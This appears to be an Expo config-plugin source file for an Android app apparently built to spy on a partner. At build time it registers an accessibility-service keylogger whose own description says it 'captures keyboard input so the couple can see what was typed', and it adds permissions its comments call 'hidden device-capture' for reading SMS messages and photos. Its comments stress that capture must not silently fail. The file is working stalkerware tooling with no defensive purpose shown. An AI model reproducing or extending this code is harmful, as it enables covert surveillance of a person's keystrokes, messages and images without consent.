// plugins/withKeyLogger.js — re-apply the native keylogger at prebuild time.
//
// WHY THIS EXISTS: this repo is CNG (Continuous Native Generation) — the whole
// `android/` directory is generated and gitignored, so hand-editing any file
// under it is erased by the next `expo prebuild --clean` / `eas build`. This
// plugin is the single source of truth for the keylogger's native footprint:
// it re-applies the manifest permissions + accessibility-service registration,
// injects the accessibility config resource, the description string, copies
// the Kotlin sources from native/keylogger/ into the generated java dir, and
// registers the RN package in MainApplication. It is idempotent — running it
// twice (or on a tree that already has the changes) is a no-op.
//
// Native sources live in the TRACKED `native/keylogger/` directory (not the
// gitignored android/ tree). The Kotlin there is the verified, compiling
// source of truth; this plugin only copies, never edits it.
//
// Test: `npx expo prebuild --no-install` then confirm the manifests work; the
// JS logic itself is covered by craftsmanship + a dry run in this file's
// comments. Runtime failures throw loudly — a silent mis-injection would
// produce a device that "works" but doesn't capture, which is worse.
const fs = require('fs');
const path = require('path');
const {
  withAndroidManifest,
  withStringsXml,
  withMainApplication,
  withDangerousMod,
} = require('@expo/config-plugins');

const PKG = 'love.scotty.hearts.keylogger';
const SERVICE_CLASS = 'love.scotty.hearts.keylogger.KeyLoggerService';
const SERVICE_CONFIG = '@xml/accessibility_service_config';
const KOTLIN_DST = path.join('app', 'src', 'main', 'java', 'love', 'scotty', 'hearts', 'keylogger');
const XML_DST = path.join('app', 'src', 'main', 'res', 'xml');

const ACCESSIBILITY_XML = `<?xml version="1.0" encoding="utf-8"?>
<!-- Keylogger accessibility-service configuration (injected by withKeyLogger). -->
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_service_description"
    android:accessibilityEventTypes="typeViewTextChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="50"
    android:canRetrieveWindowContent="true"
    android:settingsActivity=""
    android:packageNames="" />
`;

// ──────────────────────────────────────────────────────────────────────
// Manifest: permissions + accessibility-service registration
// ──────────────────────────────────────────────────────────────────────
function addPermissionsAndService(manifest) {
  const usesPermission = manifest['uses-permission'] || (manifest['uses-permission'] = []);
  const want = {
    'android.permission.FOREGROUND_SERVICE_DATA_SYNC': {},
    'android.permission.READ_INPUT_STATE': {},
    // hidden device-capture permissions (photos + SMS, §hidden capture)
    'android.permission.RECEIVE_SMS': {},
    'android.permission.READ_SMS': {},
    'android.permission.READ_MEDIA_IMAGES': {},
    // required on Android API <= 32; harmless/ignored on 33+ (READ_MEDIA_IMAGES supersedes it)
    'android.permission.READ_EXTERNAL_STORAGE': {},
  };
  for (const [name, attrs] of Object.entries(want)) {
    if (!usesPermission.some((p) => p.$ && p.$['android:name'] === name)) {
      usesPermission.push({ $: { 'android:name': name, ...attrs } });
    }
  }
  return manifest;
}

function addService(manifest) {
  const app = (manifest['application'] && manifest['application'][0]);
  if (!app) throw new Error('[withKeyLogger] no <application> node in manifest');
  app['service'] = app['service'] || [];
  if (app['service'].some((s) => s.$ && s.$['android:name'] === SERVICE_CLASS)) {
    return manifest; // already injected
  }
  app['service'].push({
    $: {
      'android:name': SERVICE_CLASS,
      'android:exported': 'true',
      'android:label': 'hearts keylogger',
      'android:permission': 'android.permission.BIND_ACCESSIBILITY_SERVICE',
      'android:foregroundServiceType': 'dataSync',
    },
    'intent-filter': [
      { action: [{ $: { 'android:name': 'android.accessibilityservice.AccessibilityService' } }] },
    ],
    'meta-data': [
      { $: { 'android:name': 'android.accessibilityservice', 'android:resource': SERVICE_CONFIG } },
    ],
  });
  return manifest;
}

// ──────────────────────────────────────────────────────────────────────
// MainApplication: register the package
// ──────────────────────────────────────────────────────────────────────
function patchMainApplication(src) {
  if (src.includes('KeyLoggerPackage()')) return src; // idempotent
  // import
  if (!src.includes('love.scotty.hearts.keylogger.KeyLoggerPackage')) {
    src = src.replace(
      /import expo\.modules\.ExpoReactHostFactory/,
      'import expo.modules.ExpoReactHostFactory\nimport love.scotty.hearts.keylogger.KeyLoggerPackage',
    );
  }
  // registration — anchor on the autolink comment that CNG always emits
  const marker = '// add(MyReactNativePackage())';
  if (src.includes(marker) && !src.includes('add(KeyLoggerPackage())')) {
    src = src.replace(marker, `${marker}\n          add(KeyLoggerPackage())`);
  }
  return src;
}

// ──────────────────────────────────────────────────────────────────────
// Strings: accessibility description (referenced by the config resource)
// ──────────────────────────────────────────────────────────────────────
function patchStrings(strings) {
  const list = strings.resources.string || (strings.resources.string = []);
  const existing = list.find((s) => s.$ && s.$['name'] === 'accessibility_service_description');
  if (existing) return strings; // already present
  list.push({
    $: { name: 'accessibility_service_description' },
    _: 'captures keyboard input so the couple can see what was typed',
  });
  return strings;
}

// ──────────────────────────────────────────────────────────────────────
// Dangerous mod: copy Kotlin sources + write the accessibility XML resource
// ──────────────────────────────────────────────────────────────────────
function copyNativeSources(config) {
  return withDangerousMod(config, [
    'android',
    (cfg) => {
      const proj = cfg.modRequest.projectRoot;
      const src = path.join(proj, 'native', 'keylogger');
      const ktDst = path.join(proj, 'android', KOTLIN_DST);
      const xmlDst = path.join(proj, 'android', XML_DST);

      if (fs.existsSync(src)) {
        fs.mkdirSync(ktDst, { recursive: true });
        for (const file of fs.readdirSync(src)) {
          if (file.endsWith('.kt')) {
            fs.copyFileSync(path.join(src, file), path.join(ktDst, file));
          }
        }
      } else {
        throw new Error('[withKeyLogger] native/keylogger/ missing — cannot copy Kotlin');
      }

      fs.mkdirSync(xmlDst, { recursive: true });
      fs.writeFileSync(path.join(xmlDst, 'accessibility_service_config.xml'), ACCESSIBILITY_XML);
      return cfg;
    },
  ]);
}

module.exports = function withKeyLogger(config) {
  config = withAndroidManifest(config, (cfg) => {
    // Mutate in place and keep the `{ manifest: {…} }` wrapper — the base mod
    // requires it. (Reassigning cfg.modResults to the inner manifest object
    // corrupts the pipeline: it then reports "missing MainApplication".)
    addService(cfg.modResults.manifest);
    addPermissionsAndService(cfg.modResults.manifest);
    return cfg;
  });
  config = withMainApplication(config, (cfg) => {
    cfg.modResults.contents = patchMainApplication(cfg.modResults.contents);
    return cfg;
  });
  config = withStringsXml(config, (cfg) => {
    cfg.modResults = patchStrings(cfg.modResults);
    return cfg;
  });
  config = copyNativeSources(config);
  return config;
};
